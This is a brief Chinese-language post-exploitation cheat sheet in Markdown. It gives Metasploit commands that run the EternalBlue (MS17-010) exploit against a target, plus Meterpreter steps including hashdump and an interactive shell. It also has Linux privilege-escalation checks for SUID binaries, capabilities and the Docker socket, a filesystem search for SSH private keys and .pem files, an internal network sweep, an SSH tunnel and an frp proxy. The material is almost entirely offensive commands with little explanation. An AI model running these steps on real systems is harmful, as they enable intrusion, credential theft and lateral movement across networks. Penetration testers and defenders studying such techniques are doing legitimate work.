# 后渗透

## Metasploit

```bash
# 启动
msfconsole

# 搜索漏洞利用
msf6 > search eternalblue

# 使用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.2
msf6 > run

# Meterpreter（后渗透）
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell
```

## 提权

```bash
# Linux 内核漏洞提权（不推荐生产环境验证）
uname -a
# 检查 SUID
find / -perm -4000 2>/dev/null

# 检查 Capabilities
getcap -r / 2>/dev/null

# 检查 Docker 逃逸
ls -la /var/run/docker.sock
```

## 横向移动

```bash
# SSH 密钥查找
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null

# 内网扫描
nmap -sn 10.0.0.0/24

# SSH 隧道
ssh -L 8080:internal-server:80 jump-box

# frp 代理
./frpc -c frpc.toml
```
